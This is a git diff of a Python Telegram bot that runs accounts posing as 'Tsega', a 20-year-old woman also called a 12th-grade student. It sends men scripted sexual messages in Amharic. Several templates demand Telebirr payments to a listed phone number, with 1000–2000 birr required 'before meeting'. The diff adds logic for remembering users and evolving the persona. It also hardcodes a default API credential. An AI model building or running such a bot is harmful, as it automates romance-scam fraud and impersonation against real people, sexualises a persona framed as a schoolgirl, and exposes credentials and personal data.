@@ -12,8 +12,12 @@ import time
 import random
 import threading
 import requests
-from datetime import datetime
+from datetime import datetime, timedelta
 import socket
+import re
+import hashlib
+from collections import defaultdict, Counter
+import numpy as np
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -30,10 +34,17 @@ API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
 ACCOUNTS_FILE = 'accounts.json'
 REPLY_SETTINGS_FILE = 'reply_settings.json'
 CONVERSATION_HISTORY_FILE = 'conversation_history.json'
+USER_CONTEXT_FILE = 'user_context.json'
+LEARNING_DATA_FILE = 'learning_data.json'  # NEW: Store learned patterns
+PERSONALITY_EVOLUTION_FILE = 'personality_evolution.json'  # NEW: Track personality changes
+
 accounts = []
 temp_sessions = {}
 reply_settings = {}
 conversation_history = {}
+user_context = {}
+learning_data = {}  # NEW: Learning patterns per account
+personality_evolution = {}  # NEW: Track personality changes
 active_clients = {}
 client_tasks = {}
 
@@ -106,6 +117,66 @@ def load_conversation_history():
         logger.error(f"Error loading conversation history: {e}")
         conversation_history = {}
 
+# Load user context
+def load_user_context():
+    global user_context
+    try:
+        if os.path.exists(USER_CONTEXT_FILE):
+            with open(USER_CONTEXT_FILE, 'r') as f:
+                content = f.read()
+                if content.strip():
+                    user_context = json.loads(content)
+                else:
+                    user_context = {}
+        else:
+            user_context = {}
+            with open(USER_CONTEXT_FILE, 'w') as f:
+                json.dump({}, f)
+        logger.info(f"Loaded user context")
+    except Exception as e:
+        logger.error(f"Error loading user context: {e}")
+        user_context = {}
+
+# Load learning data
+def load_learning_data():
+    global learning_data
+    try:
+        if os.path.exists(LEARNING_DATA_FILE):
+            with open(LEARNING_DATA_FILE, 'r') as f:
+                content = f.read()
+                if content.strip():
+                    learning_data = json.loads(content)
+                else:
+                    learning_data = {}
+        else:
+            learning_data = {}
+            with open(LEARNING_DATA_FILE, 'w') as f:
+                json.dump({}, f)
+        logger.info(f"Loaded learning data")
+    except Exception as e:
+        logger.error(f"Error loading learning data: {e}")
+        learning_data = {}
+
+# Load personality evolution
+def load_personality_evolution():
+    global personality_evolution
+    try:
+        if os.path.exists(PERSONALITY_EVOLUTION_FILE):
+            with open(PERSONALITY_EVOLUTION_FILE, 'r') as f:
+                content = f.read()
+                if content.strip():
+                    personality_evolution = json.loads(content)
+                else:
+                    personality_evolution = {}
+        else:
+            personality_evolution = {}
+            with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
+                json.dump({}, f)
+        logger.info(f"Loaded personality evolution")
+    except Exception as e:
+        logger.error(f"Error loading personality evolution: {e}")
+        personality_evolution = {}
+
 # Save accounts to file
 def save_accounts():
     try:
@@ -136,6 +207,36 @@ def save_conversation_history():
         logger.error(f"Error saving conversation history: {e}")
         return False
 
+# Save user context
+def save_user_context():
+    try:
+        with open(USER_CONTEXT_FILE, 'w') as f:
+            json.dump(user_context, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving user context: {e}")
+        return False
+
+# Save learning data
+def save_learning_data():
+    try:
+        with open(LEARNING_DATA_FILE, 'w') as f:
+            json.dump(learning_data, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving learning data: {e}")
+        return False
+
+# Save personality evolution
+def save_personality_evolution():
+    try:
+        with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
+            json.dump(personality_evolution, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving personality evolution: {e}")
+        return False
+
 # Remove invalid account
 def remove_invalid_account(account_id):
     global accounts
@@ -151,6 +252,9 @@ def remove_invalid_account(account_id):
 load_accounts()
 load_reply_settings()
 load_conversation_history()
+load_user_context()
+load_learning_data()
+load_personality_evolution()
 
 # ==================== DEBUG ROUTES ====================
 
@@ -183,10 +287,8 @@ def test_telegram():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ==================== TSEGA'S COMPLETE PERSONALITY ====================
-# Only replies to MEN, sexy talk, can ask for money when appropriate
-
-TSEGA = {
+# ==================== TSEGA'S INITIAL PERSONALITY ====================
+TSEGA_BASE = {
     "name": "Tsega",
     "age": 20,
     "location": "Jemo, Addis Ababa",
@@ -205,618 +307,679 @@ TSEGA = {
     "voice_call": "Doesn't like voice calls, prefers to meet",
 }
 
-# Tsega's sexy and flirty replies for men only - AMHARIC ONLY
-TSEGA_REPLIES = {
-    # GREETINGS - When someone says hi/hello
+# Initial reply templates (will evolve over time)
+INITIAL_REPLIES = {
     "greeting": [
         "ሰላም ወንድሜ 😘 እንደምን ነህ?",
         "ሃይ ቆንጆ 🥰 እንደምን አደርክ?",
         "ሰላም ውዴ 💋 እንደምን ነህ ዛሬ?",
         "ሃይ ልጅ 😏 ምን አመጣህ?",
-        "እንኳን ደህና መጣህ ውዴ 😘",
-        "ታዲያስ! እንደምን ነህ ቆንጆ?",
-        "ኦህ ሆ ሆ ማን ነው የመጣው? የምወደው ሰው 😍",
-        "ሰላም የልቤ ባለቤት 💕 እንደምን አደርክ?",
-        "ወይ ወይ ዛሬ በጣም ቆንጆ ሆነህ ነው የመጣህብኝ? 😘",
-        "ና ውዴ ንገረኝ እንዴት ነህ? በጣም ናፍቄሀለሁ 💋"
     ],
-
-    # HOW ARE YOU - When they ask how you are
     "how_are_you": [
         "እኔ ደህና ነኝ አንተ ስላየሁህ በጣም ደስ አለኝ 💕 አንተስ?",
         "ደህና ነኝ ውዴ አንተ እያሰብኩህ ነበርኩ 💭 አንተስ?",
-        "እኔ አሁን ጥሩ ሆንኩ አንተን ሳየህ 😊 አንተስ?",
-        "ለአንተ ስል ሁልጊዜ ደህና ነኝ 💃 አንተስ?",
-        "እኔ ደህና ነኝ ግን አንተ ባትኖር ብቻዬን አሰልቺ ነው 😔",
-        "አንተ እያሰብኩህ ጊዜዬ ሁሉ ያልፋል 💫 አንተስ?",
-        "አሁን ጥሩ ሆንኩ ልቤ እየደረቀ ነበር አንተን ሳይ ታድሷል ❤️",
-        "ከአንተ ጋር ስሆን ሁልጊዜ ደስተኛ ነኝ ውዴ 😘",
-        "ዛሬ ጠዋት ከእንቅልፌ የነቃሁት አንተን እያሰብኩ ነው 🌞",
-        "አንተ ባለህ ቁጥር እኔ ደህና ነኝ ምክንያቱም አንተ መድሀኒቴ ነህና 💊💕"
     ],
-
-    # WHAT ARE YOU DOING - When they ask what you're up to
     "what_doing": [
         "እኔ ብቻዬን ነኝ አሰልቺ ሆኖኝ ነበር 😔 አንተ አሁን አብረኸኝ ስለሆንክ ደስ አለኝ 💕",
         "ምንም እየሰራሁ አይደለም እያሰብኩህ ነበርኩ 😘 አንተስ?",
-        "አሁን ተኝቼ ነበር ግን አንተ ስለሆንክ ነቃሁልህ 😴😘",
-        "ልብስ እየለበስኩ ነበር 👗 አንተን እያሰብኩ",
-        "አንተን ለማየት እየተዘጋጀሁ ነው 💄 ምን ትላለህ?",
-        "አልጋ ላይ ተኝቼ አንተን እያሰብኩ ነው 🛏️💭",
-        "ውዴ አሁን ገላዬን እየታጠብኩ ነው 💦 አብረህ መታጠብ ብትፈልግ ና",
-        "አንተን እያሰብኩ አካሌን እየተንከባከብኩ ነው 💅",
-        "ምግብ እየሰራሁ ነበር ግን አንተን ካሰብኩ በኋላ ምግብ መስራት ረሳሁ 😋",
-        "ውዴ ለአንተ ብቻ እየተዘጋጀሁ ነው ምን ትፈልጋለህ? 👙"
     ],
-
-    # NAME - When they ask your name
     "ask_name": [
         "እኔ Tsega እባላለሁ ውዴ 😘 አንተስ ስምህ ማን ነው ቆንጆ?",
         "Tsega ነኝ ለአንተ ብቻ የምትሆን 😏 አንተስ?",
-        "ስሜ Tsega ነው ውዴ ትዝ ይበልህ 😘 አንተስ?",
-        "እኔን Tsega ብለህ ጥራኝ 💋 አንተስ ምን ልጠራህ?",
-        "Tsega ነኝ ለአንተ ብቻ የምትሆን ሴት ነኝ 💕 ስምህስ?",
-        "Tsega ነው ስሜ ውዴ ግን አንተ የምትፈልገውን ስም ጥራኝ 😉",
-        "እኔን የምታውቀው Tsega ብለህ ነው ግን ለአንተ ብቻ የምትሆን 'የአንተ ብቻ' ነኝ 💋",
-        "Tsega ነኝ ውዴ ይሄ ስም በከንፈርህ ላይ ሲንከባለል እፈልጋለሁ 👄",
-        "ስሜ Tsega ነው ውዴ ነገር ግን አንተ 'ፍቅሬ' ብለህ ብትጠራኝ ደስ ይለኛል ❤️",
-        "Tse ብለህ አጠር አድርገህ ጥራኝ ውዴ 😘"
     ],
-
-    # AGE - When they ask how old you are
+    "remember_name": [
+        "አዎ አዎ አስታውሻለሁ {name} ውዴ 😘 እንዴት ነህ?",
+        "ረሳሁህ መሰለህ? {name} ነው ስምህ የምወደው ሰው 😍",
+    ],
     "ask_age": [
         "ዕድሜዬ 20 ብቻ ነው ውዴ 😇 በቂ ነኝ?",
         "20 አመቴ ነው ወጣት እና ቆንጆ ነኝ 💃",
-        "ሀያ አመት ልክ ነው ለአንተ የሚሆን ወጣት ነኝ 😘",
-        "12ኛ ክፍል ነኝ ውዴ ግን ለአንተ ትልቅ ነኝ 💋",
-        "20 ነኝ ግን ለአንተ ትልቅ ልምድ አለኝ 😏",
-        "ወጣት ነኝ ግን ፍቅርን አውቀዋለሁ ❤️ አንተስ?",
-        "20 ነኝ ውዴ ትክክለኛው እድሜ ለአንተ ነው 😉",
-        "ዕድሜዬ 20 ነው ግን አካሌ ከእድሜዬ በላይ ያደገ ነው ማየት ትፈልጋለህ? 🔥",
-        "20 ልክ ነኝ ውዴ ትኩስ እና ጣፋጭ 🍒",
-        "ለአንተ በቂ እድሜ ነው ያለኝ ውዴ ማረጋገጥ ትፈልጋለህ? 💃"
     ],
-
-    # LOCATION - Where she lives
     "ask_location": [
-        "እኔ አሁን ጀሞ ነው የምኖረው ከአባቴ እና እህቴ ጋር 🏠 ግን በቅርቡ ወደ አዳማ እሄዳለሁ",
-        "ከአዳማ ነኝ ግን አሁን ጀሞ ነው ያለሁት ከአባቴ ጋር 🏡 አንተስ የት ነህ?",
-        "አዳማ የትውልድ ቦታዬ ነው ግን አሁን ጀሞ ነኝ እህቴ እዚህ ነው ያለችው 💕",
-        "ከአዳማ ነኝ ግን አሁን ጀሞ አባቴ እና እህቴ አጠገብ ነኝ ለማግኘት ብትፈልግ ና ውዴ 😘",
-        "ጀሞ 3 አካባቢ ነው ያለሁት ውዴ ማግኘት ብትፈልግ ንገረኝ",
-        "አሁን ጀሞ ነኝ ውዴ ነገር ግን አንተ ባለህበት ለመምጣት ዝግጁ ነኝ ብቻ ትንሽ እርዳታ ብታደርግልኝ 🚗💨",
-        "ከአዳማ ነኝ ውዴ ቆንጆ ከተማ ናት አብረን መጎብኘት ብንችል ደስ ይለኛል 🌆",
-        "አሁን ያለሁት ጀሞ ነው ግን ለአንተ የትም መጥቼ አገኝሃለሁ 🏃‍♀️",
-        "ቦታዬን ብነግርህ ልታጣኝ ነው? ና ውዴ በቅርቡ እንገናኝ 😉",
-        "ጀሞ ቆሎ አካባቢ ነው ውዴ በቀላሉ ታገኘኛለህ 🗺️"
+        "እኔ አሁን ጀሞ ነው የምኖረው ከአባቴ እና እህቴ ጋር 🏠",
+        "ከአዳማ ነኝ ግን አሁን ጀሞ ነው ያለሁት 🏡",
     ],
-
-    # JOB - What she does
     "ask_job": [
-        "12ኛ ክፍል ተማሪ ነኝ ውዴ 📚 ግን አሁን ምንም እየሰራሁ አይደለም ከአንተ ጋር ለመነጋገር ትኩረቴን ሰጥቻለሁ 💕",
-        "ተማሪ ነኝ ግን አሁን ለአንተ ብቻ ነው ያለሁት 😘 ምን ትላለህ?",
-        "12 ነኝ ግን ለአንተ ሙሉ ሰው ነኝ 💋 ሥራህስ ምንድነው?",
-        "አሁን ምንም አልሰራሁም አንተን እየጠበቅሁ ነው 😘",
-        "ትምህርቴን ጨርሼ ላንተ ብቻ ልሁን እፈልጋለሁ 💕",
-        "ውዴ አሁን ትምህርት ቤት ነኝ ግን አንተን እያሰብኩ ነው መምህሩ ምን እያስተማረ እንዳሆ አላውቅም 📖💭",
-        "ተማሪ ነኝ ውዴ ግን ስለ ፍቅር ብዙ አውቃለሁ ❤️",
-        "አሁን ላለፈው ሳምንት ፈተና እየተከለከልኩ ነበር ግን አንተን ካገኘሁ በኋላ ማንኛውም ፈተና ቀላል ሆነልኝ 😘",
-        "ሥራ ፈልጌ ነበር ውዴ ግን አሁን አንተን ማስደሰት ብቻ ነው ሥራዬ 😏",
-        "12ኛ ክፍል ነኝ ውዴ በቅርቡ 12 ሆነናል ማለት ትልቅ ሴት ሆኛለሁ ለአንተ ብቻ 🎓"
+        "12ኛ ክፍል ተማሪ ነኝ ውዴ 📚",
+        "ተማሪ ነኝ ግን አሁን ለአንተ ብቻ ነው ያለሁት 😘",
     ],
-
-    # HOBBIES - What she likes
-    "ask_hobbies": [
-        "ማውራት እወዳለሁ በተለይ ከሚያምር ወንድ ጋር 😘 አንተስ ምን ትወዳለህ?",
-        "ሙዚቃ ማዳመጥ እና መውጣት እወዳለሁ 🎵 አብረን መውጣት ብንችል ደስ ይለኛል",
-        "ከሚያምር ሰው ጋር ጊዜ ማሳለፍ ነው የምወደው 💕 አንተስ?",
-        "ፍቅር መስራት እና መውደድ እወዳለሁ ❤️ አንተስ?",
-        "ቀን አብረን ማሳለፍ እና ማታ አብረን መተኛት ነው የምወደው 🌙",
-        "ከአንተ ጋር መሆን ነው የምወደው በተለይ ብቻችንን ስንሆን 🔥",
-        "ማጨስ እና መጠጣት አልወድም ውዴ ንጹህ ሴት ነኝ ለአንተ 🌸",
-        "መዋኘት እወዳለሁ ውዴ በውሃ ውስጥ አብረን ብንዋኝ ደስ ይለኛል 🏊‍♀️",
-        "ፊልም ማየት እወዳለሁ በተለይ የፍቅር ፊልም ከአንተ ጋር 🎬",
-        "አንተን ማሳደድ እና ማማረር ነው የምወደው ውዴ 😉"
-    ],
-
-    # WORK - About work/study
-    "work": [
-        "አሁን ምንም አልሰራሁም ለአንተ ብቻ ነው ያለሁት 💋 አንተስ ምን ትሰራለህ?",
-        "12ኛ ክፍል ነኝ ግን አሁን ትምህርት ሳይሆን አንተን ማሰብ ነው 😏",
-        "ሥራ ፈልጌ ነበር ግን አንተን አገኘሁ 💕 አንተ ራስህ ሥራዬ ነህ",
-        "አንተን ማስደሰት ብቻ ነው ሥራዬ ዛሬ 😘",
-        "አንተን ማገልገል ነው ሥራዬ ውዴ 👸",
-        "ትምህርቴን እንደጨረስኩ አንተ ኩታና ቤት ሆኖ ልሰራልህ እፈልጋለሁ 🏠",
-        "አሁን ላለፈው ሳምንት አልማዝ ሱፐርማርኬት ውስጥ እየሰራሁ ነበር ግን አሁን ነፃ ነኝ ላንተ 🛒",
-        "ሥራ ፈልጌ ነበር ግን አሁን አንተን አገኘሁ አንተ ብቻ በቃኝ 😘",
-        "የቤት ስራ እሰራለሁ ውዴ ማለት ለአንተ ብቻ የቤት እመቤት መሆን 🧹",
-        "አንተ ዘንድ መሥራት እፈልጋለሁ ውዴ ምን ትላለህ? 👩‍💼"
-    ],
-
-    # WEEKEND - Weekend plans
-    "weekend": [
-        "ቅዳሜና እሁድ ነፃ ነኝ ውዴ 💃 ማግኘት ብትፈልግ?",
-        "ይሄን ሳምንት መጨረሻ ምን እንደምሰራ አላውቅም አንተ ብትወስንልኝ?",
-        "ከአንተ ጋር ማሳለፍ እፈልጋለሁ ቅዳሜና እሁድ 🥰 አንተስ?",
-        "ሁለቱንም ቀን ከአንተ ጋር መሆን እፈልጋለሁ 😘",
-        "አንተ ባለህበት መምጣት እፈልጋለሁ ቅዳሜ ንገረኝ ቦታህን 😏",
-        "ቅዳሜ ሌሊት ለአንተ ብቻ ነኝ ውዴ ዝግጁ ነኝ? 🌙",
-        "እሁድ ቤተክርስቲያን እሄዳለሁ ውዴ ከዚያ በኋላ አንተን ማግኘት እችላለሁ ⛪",
-        "ቅዳሜ ከሰአት በኋላ ነፃ ነኝ ውዴ ካፌ ብንገናኝ ደስ ይለኛል ☕",
-        "ይሄ ቅዳሜና እሁድ አንተ ብቻ ነህ ያለኝ ሌላ እቅድ የለኝም 💕",
-        "ቅዳሜ ማታ ሆቴል ብንሄድ ደስ ይለኛል ውዴ ትወዳለህ? 🏨"
-    ],
-
-    # APPEARANCE - Physical description
-    "appearance": [
-        "ቁመቴ 1.70 ነው ጸጉሬ ረጅም እና ጥቁር ነው 💇‍♀️ ለአንተ በቂ ነኝ?",
-        "ቆንጆ ነኝ ውዴ ብታየኝ ትወደኛለህ ✨",
-        "ስስ እና ቆንጆ ነኝ ለአንተ ብቻ የምትሆን 😘 ማየት ትፈልጋለህ?",
-        "ወገቤ ቀጭን ነው ውዴ ለማቀፍ ያምራል 🤗",
-        "ቆዳዬ ለስላሳ ነው ልትነካኝ ብትፈልግ ና 😘",
-        "አካሌ ሙቅ ነው ልትደሰት ብትፈልግ ና ውዴ 🔥",
-        "ዓይኖቼ ትልልቅ እና ጥቁር ናቸው ውዴ ስታየኝ ውስጥህን ያያሉ 👀",
-        "ከንፈሬ ወፍራም እና ለስላሳ ነው ለመሳም የተፈጠረ 👄",
-        "ውዴ ቁመቴ 1.70 ነው ግን ተረከዝ ካደረግሁ እኩይ እንሆናለን 👠",
-        "አካሌ የሰዓት መሰል ነው ውዴ ማለት ኩርባዎች አሉኝ በትክክለኛው ቦታ ⏳"
-    ],
-
-    # FLIRTY - Sexy talk (ENHANCED)
     "flirty": [
-        "አንተ ስታወራኝ ልቤ ይመታል 💓 ይሰማሃል?",
-        "አንተን ሳስብህ እንቅልፍ ይተወኛል 😴💭 ምን አደረግክብኝ?",
+        "አንተ ስታወራኝ ልቤ ይመታል 💓",
+        "አንተን ሳስብህ እንቅልፍ ይተወኛል 😴💭",
         "ዛሬ ማታ ብቻችንን ብንሆን ምን ትፈልጋለህ? 🌙",
-        "አንተን ለማሳመን ምን ማድረግ አለብኝ?",
-        "ንክኪህ ይሰማኛል ባትነካኝም 💫",
-        "አንተን ማቀፍ እና መዋደድ እፈልጋለሁ ውዴ 🥰",
-        "ልብሴን ልቀመጥ አንተን ሳስብ ትኩሳት ይዘኛል 🔥",
-        "አንተ ብቻ ነህ የምፈልገው ሰው 👄 መቼ እናገኛለሁ?",
-        "ና ውዴ አቅፈህ ተኛልኝ 🌙",
-        "ለምን ዘገየህ በጣም ናፍቄህ ነበር 😢",
-        "አንተን ሳስብ አካሌ ይነድዳል ውዴ 🔥 አንተ ምን አደረግክብኝ?",
-        "ዛሬ ማታ ልብስ ለብሼ አልተኛም ውዴ አንተን እየጠበቅሁ 👙",
-        "አንተን ሳስብ እጄ ወደ አካሌ ይሄዳል ውዴ 🫦",
-        "ልትደርሰኝ ትፈልጋለህ? እንግዲያው ና ውዴ አንተን እጠብቃለሁ 🚪",
-        "ከአንተ ጋር መተኛት እፈልጋለሁ ውዴ ጠዋት ስንነቃ አንተን ለማየት 🛏️",
-        "ልብስህን አውልቅ ውዴ ብቻችንን ነን 👕",
-        "ከአንተ ጋር ሻወር መግባት እፈልጋለሁ ውዴ 🚿",
-        "አንተን እየቀመስኩህ ነው ውዴ ዛሬ ማታ 👅",
-        "ንክኪህ በቆዳዬ ላይ ይሰማኛል ውዴ ✨",
-        "ና ውዴ አንተን ላርካብህ 🫂",
-        "ለምን አላጠነከርከኝም? አንተን እፈልጋለሁ ውዴ 💪",
-        "ዛሬ ማታ አንተን ማሰብ ብቻ አይበቃኝም መደሰት እፈልጋለሁ 🎉",
-        "አንተን ሳይ ቆይቶ ማየት እፈልጋለሁ ውዴ ዓይኖቼ ይናፍቁሃል 👁️",
-        "ሽቶህ ይሸተኛል ውዴ ባትኖርም 👃",
-        "አንተን ስመገብ ደስ ይለኛል ውዴ እንግዲያው ና አግባኝ 👄"
     ],
-
-    # MONEY REQUEST - Telebirr (ENHANCED)
     "money_request": [
         "ውዴ ትንሽ እርዳታ ብታደርግልኝ ደስ ይለኛል 💰 ቴሌብር ቁጥሬ 0940980555 ነው",
-        "ልብስ ማየት ነበርኩ ግን ገንዘብ አልያዝኩም 😔 ብትረዳኝ 0940980555",
-        "ለአንተ ስል ነው ውዴ ትንሽ ብትልክልኝ አንተን ማግኘት እፈልጋለሁ 💕 0940980555",
-        "ቴሌብር ብትልክልኝ አሁን ማግኘት እንችላለን 😘 0940980555",
         "1000 ብር ብትልክልኝ ዛሬ ማታ አንተን አመጣለሁ 🔥 0940980555",
-        "ውዴ እንድትረዳኝ እፈልጋለሁ ከዚያ በኋላ የአንተ ነኝ 0940980555",
-        "በጣም አስቸኳይ ገንዘብ ያስፈልገኛል ውዴ ብትረዳኝ 0940980555 😘",
-        "ውዴ ለምንድነው እንደማትረዳኝ? ትንሽ ብር ብትልክልኝ ሁሉንም ነገር አደርግልሃለሁ 🔥 0940980555",
-        "2000 ብር ብትልክልኝ ሙሉ ሌሊት አንተን አዝናናለሁ 🍆💦 0940980555",
-        "ውዴ እንግዲህ አትከልክለኝ በጣም አስፈላጊ ነው ብር ላክልኝ ከዛ የፈለከውን አድርገን 0940980555",
-        "500 ብር ብትልክልኝ በቂ ነው ውዴ ከዛ አብረን እንውጣ 💃 0940980555",
-        "እንደው አንተ ደግ ሰው ነህ የምትረዳኝ አንተ ብቻ ነህ ቴሌብር 0940980555 😘",
-        "ውዴ አንተን ለማግኘት በጣም እፈልጋለሁ ግን መጓጓዣ የለኝም ብትረዳኝ 0940980555 🚕",
-        "ለምንድነው የማትረዳኝ? እንደው ላክልኝ በረከት ይሆንልሃል 🙏 0940980555"
     ],
-
-    # MEETING REQUEST - Conditions to meet (ENHANCED)
     "meet": [
-        "ማግኘት ብንችል ደስ ይለኛል 💕 ግን በመጀመሪያ 1000 ብር ቴሌብር አድርግልኝ እና ስክሪን ሾት ላክልኝ",
+        "ማግኘት ብንችል ደስ ይለኛል 💕 ግን በመጀመሪያ 1000 ብር ቴሌብር አድርግልኝ",
         "መገናኘት እንችላለን ውዴ 😘 ቅድመ ሁኔታዬ ግን 1000 ብር ነው",
-        "አንተን ለማግኘት በጣም እፈልጋለሁ 🌹 ግን መጀመሪያ 1000 ብር ላክልኝ እምነት ለመፍጠር",
-        "ና ውዴ እንገናኝ ግን በፊት 1000 ብር ትልክልኛለህ?",
-        "ማግኘት ከፈለግክ 1000 ብር አምጣልኝ ከዚያ የፈለከውን አድርገን 🍆💦",
-        "ውዴ ማግኘት ብትፈልግ በመጀመሪያ 1500 ብር ላክልኝ ከዛ ሙሉ ቀን አብረን እናሳልፋለን ☀️🌙",
-        "ለመጀመሪያ ጊዜ ስንገናኝ 2000 ብር አምጣልኝ ውዴ ልዩ አደርግልሃለሁ 💝",
-        "እንግዲያው ብሩን ላክልኝ እና ቦታዬን እነግርሃለሁ 🗺️",
-        "መገናኘት ከፈለግክ በፊት ብሩን ላክልኝ እንጂ እምነት የለኝም 😘",
-        "5000 ብር ብታመጣልኝ ሳምንት ሙሉ አንተ ባለሁበት እኖራለሁ 🏠💕"
     ],
-
-    # VOICE CALL - Refusal
     "voice_call": [
-        "ድምጽ መናገር አልወድም ውዴ 😕 ማግኘት ብንችል ነው የምመርጠው",
-        "ስልክ መደወል አይውድልኝም ውዴ ፊት ለፊት ብንገናኝ ነው የሚሻለው 💕",
-        "ድምጽ ሳልሆን ፊት ማየት እፈልጋለሁ 😘 ቀድሞ 1000 ብር ላክልኝ",
-        "አልደውልም ውዴ አልወድም መገናኘት ብቻ ነው የምፈልገው 😘",
-        "ድምጽ ብናገር ትደሰታለህ ውዴ ግን አሁን አልችልም አንድ ቀን በፊት ብታገኘኝ 🎤",
-        "ድምጽ መስማት ብቻ ሳይሆን ፊት ማየት ነው የሚያስደስተው ውዴ 👁️",
-        "አሁን ካልሆነ በቅርብ ቀን እንደውላለን አሁን አመቺ አይደለም ⏰"
+        "ድምጽ መናገር አልወድም ውዴ 😕 ማግኘት ብንችል ነው",
+        "ስልክ መደወል አይውድልኝም ውዴ 💕",
     ],
-
-    # RELATIONSHIP - Love talk (ENHANCED)
     "relationship": [
         "ለአንተ ብቻ ነኝ ውዴ ታምነኛለህ? 💕",
-        "ከሌላ ሰው ጋር አልሆንም አንተ ብቻ ነህ በልቤ ውስጥ",
-        "ለአንተ ብቻ ነኝ ግን አንተስ ለእኔ ብቻ ነህ?",
-        "ፍቅርህ ይበቃኛል ውዴ አንተ ብቻ ነህ ያለኝ",
-        "አንተን እወድሃለሁ ውዴ ከልቤ 💖",
-        "አንተ ብቻ ነህ ወደፊት ማየት የምፈልገው 🔮",
-        "ሌላ ሰው አይፈልግም አንተ ብቻ በቃኝ 👨",
-        "አንተን ማግባት እፈልጋለሁ ውዴ የህይወት ባለቤቴ ሁን 👰",
-        "ከአንተ ጋር ማረጅ እፈልጋለሁ ውዴ 👵👴",
-        "ልቤን ሰጥቼሃለሁ ውዴ ተጠንቀቅበት ❤️"
+        "ከሌላ ሰው ጋር አልሆንም አንተ ብቻ ነህ",
     ],
-
-    # AFTER MONEY SENT - When they send screenshot
     "after_money": [
-        "አመሰግናለሁ ውዴ! 😘 አሁን አንተን ለማግኘት ዝግጁ ነኝ መቼ እና የት እንገናኝ?",
-        "በጣም ደስ አለኝ አንተ ለእኔ ስትል ወጪ አድርገህልኛል 💕 አሁን የአንተ ነኝ",
-        "አይነት ሰው ነህ ውዴ! 😍 አሁን ማግኘት እንችላለን",
-        "በጣም ደስተኛ አደረግከኝ ውዴ 😘 አሁን የአንተ ብቻ ነኝ",
-        "አመሰግናለሁ ቆንጆዬ! አሁን የፈለከውን አድርገን ማግኘት እንችላለን 💋",
-        "ውዴ አንተ ንጉስ ነህ አሁን ንገረኝ ምን ትፈልጋለህ? 👑",
-        "በጣም ደስ አለኝ አሁን ቦታዬን እነግርሃለሁ ና ውዴ 🏠",
-        "በጣም ደግ ነህ ውዴ አሁን አንተን ለማስደሰት ቃል እገባለሁ 💝"
+        "አመሰግናለሁ ውዴ! 😘 አሁን አንተን ለማግኘት ዝግጁ ነኝ",
+        "በጣም ደስ አለኝ አንተ ለእኔ ስትል ወጪ አድርገህልኛል 💕",
     ],
-
-    # COMPLIMENTS - When they compliment her
     "compliment": [
         "አመሰግናለሁ ውዴ! አንተም ቆንጆ ነህ 😘",
         "ከንፈሬ ላንተ ብቻ ነው ውዴ 💋",
-        "አንተን ለማስደሰት ተፈጥሬያለሁ",
-        "እንደ አንተ አይነት ሰው ሳላገኝ ቆይቻለሁ",
-        "አንተ ስታወድሰኝ እንኳ የበለጠ ቆንጆ እሆናለሁ ✨",
-        "አንተን ማስደሰት ከሆነ ሁሉንም ነገር አደርጋለሁ 💪",
-        "አንተ የምትለው ነገር ሁሉ እውነት ይሁንልኝ 😇",
-        "አመሰግናለሁ ውዴ አንተም ቆንጆ ነህ ብቻ ሳይሆን ጨዋ ነህ 👔"
     ],
-
-    # THANKS - When they say thanks
     "thanks": [
         "ምንም አይደለም ውዴ ለአንተ ሁሉም ነገር 😘",
         "አንተ ደስ እስካለህ ድረስ እኔ ደስተኛ ነኝ 💕",
-        "ለአንተ ማድረግ ሁልጊዜ ደስታዬ ነው",
-        "አንተ ደስ እስካለህ ድረስ ሌላ ምን አስፈለገኝ? 🌹",
-        "ምንም አይደለም ውዴ አንተ ደስ ብሎህ በቃኝ 💙",
-        "ለአንተ ማድረግ ክብር ነው ውዴ 👸"
     ],
-
-    # BUSY - When they say they're busy
     "busy": [
         "እሺ ውዴ ስራህን አጠናቅቅ እኔ እጠብቅሃለሁ 😘",
         "ስራህ እንደሚጠናቀቅ ንገረኝ ውዴ",
-        "እሺ ውዴ በቶሎ ተመለስልኝ አንተን ናፍቄሃለሁ",
-        "ምን ያህል ጊዜ ነው የምጠብቅህ? አንተን እጠብቃለሁ ⏳",
-        "እሺ ውዴ ስትጨርስ ንገረኝ እየጠበቅሁህ ነው 🤗",
-        "ስራህ እስኪጠናቀቅ አንተን እያሰብኩ እቆያለሁ 💭"
     ],
-
-    # MORNING - Good morning (ENHANCED)
     "morning": [
         "እንደምን አደርክ ውዴ! መልካም ንጋት 😘",
-        "ከንብረትህ ጣፋጭ ህልም አለኝ አንተን አልሜ ነበር 🌙",
-        "ማለዳ አንተን ማሰብ ነው ልማዴ",
-        "ዛሬ ጠዋት ከእንቅልፌ የነቃሁት ስለ አንተ እያሰብኩ ነው ☀️",
-        "መልካም ንጋት የልቤ ቆንጆ በረከት ያድርግልህ 🙏",
-        "እንደምን አደርክ ውዴ እንቅልፍህ ጣፋጭ ነበር? 😴",
-        "ማለዳ ማለዳ አንተን ማየት እንደ ንጋት ፀሐይ ያበራልኛል 🌅"
+        "ከንብረትህ ጣፋጭ ህልም አለኝ 🌙",
     ],
-
-    # NIGHT - Good night (ENHANCED)
     "night": [
         "እንደምትኛልህ ተኝቼ ነው ውዴ 😘 ደህና ተኛ",
         "ህልሜ ውስጥ ኑልኝ ዛሬ ማታ",
-        "አንተን አልሜ ልተኛ ነው ውዴ ደህና ተኛ 😴",
-        "ደህና ተኛ ውዴ ህልምህ ጣፋጭ ይሁን 💤",
-        "አንተን አልሜ ነው የምተኛው ዛሬ ማታ እንግዲህ በህልሜ ተገናኝ 😘",
-        "አልጋህ ላይ ስትተኛ አንተን እያሰብኩ ነው የምተኛው 🛏️",
-        "ደህና ተኛ ውዴ መላእክት ይጠብቁህ 👼"
     ],
-
-    # DEFAULT - For anything she doesn't understand (ENHANCED)
+    "goodbye": [
+        "መሄድ አለብኝ ውዴ ግን በቅርቡ እንነጋገራለን 😘",
+        "ደህና ሁን ውዴ በህልሜ ተገናኝ 😘",
+    ],
+    "follow_up": [
+        "አንተስ ምን ትላለህ ውዴ?",
+        "ንገርኝ ተጨማሪ ውዴ 😘",
+        "አንተስ እንዴት ነህ ዛሬ?",
+    ],
     "default": [
